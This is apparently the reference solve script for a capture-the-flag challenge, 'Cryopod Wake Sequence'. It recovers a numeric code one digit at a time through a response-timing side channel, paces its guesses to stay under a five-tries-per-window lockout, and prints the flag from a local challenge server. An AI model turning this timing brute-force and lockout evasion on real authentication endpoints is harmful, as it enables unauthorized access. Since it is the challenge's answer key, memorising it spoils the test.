#!/usr/bin/env python3
"""Reference solve for Cryopod Wake Sequence. Usage: python3 solve.py [http://host:port]

Timing side channel: every correct leading digit adds about 0.5 s to the
response. Recover the code one digit at a time, and stay under the
5-tries-per-window interlock by waiting out the window whenever the server
says no tries are left (going over vents the pod and resets the code).
Standard library only.
"""
import json
import os
import sys
import time
import urllib.error
import urllib.request

URL = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")


def post(path, body=None):
    req = urllib.request.Request(URL + path, json.dumps(body or {}).encode(), {"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return json.load(r)
    except urllib.error.HTTPError as e:
        return json.load(e)


def main():
    pod = post("/api/pod")
    pod_id, digits = pod["pod"], pod["digits"]
    state = pod
    t_start = time.time()
    tries = 0

    def wake(code):
        nonlocal state, tries
        if state["tries_left"] <= 0:
            time.sleep(state["window_resets_in"] + 0.2)
        t0 = time.monotonic()
        r = post("/api/wake", {"pod": pod_id, "code": code})
        tries += 1
        if r.get("status") == "vented":
            sys.exit(f"pod vented: {r['message']}")
        state = r
        return r, time.monotonic() - t0

    # With k digits known, a wrong next digit answers in about k*0.5 s and a
    # right one in at least (k+1)*0.5 s, so split at (k+0.5)*0.5 s.
    known = ""
    step = float(os.environ.get("SOLVE_STEP", "0.5"))
    while len(known) < digits:
        k = len(known)
        found = None
        for d in "012345678":  # if 0-8 are all wrong, it's 9
            guess = (known + d).ljust(digits, "0")
            r, dt = wake(guess)
            if r.get("flag"):
                print(f"code {guess} after {tries} tries, {time.time() - t_start:.1f}s")
                print(r["flag"])
                return
            if dt > (k + 0.5) * step:
                found = d
                break
        known += found or "9"
        print(f"digit {k + 1}: {known[-1]}  (prefix {known}, {tries} tries so far)", flush=True)
    r, _ = wake(known)
    if not r.get("flag"):
        sys.exit(f"recovered {known} but it was rejected: {r}")
    print(f"code {known} after {tries} tries, {time.time() - t_start:.1f}s")
    print(r["flag"])


if __name__ == "__main__":
    main()
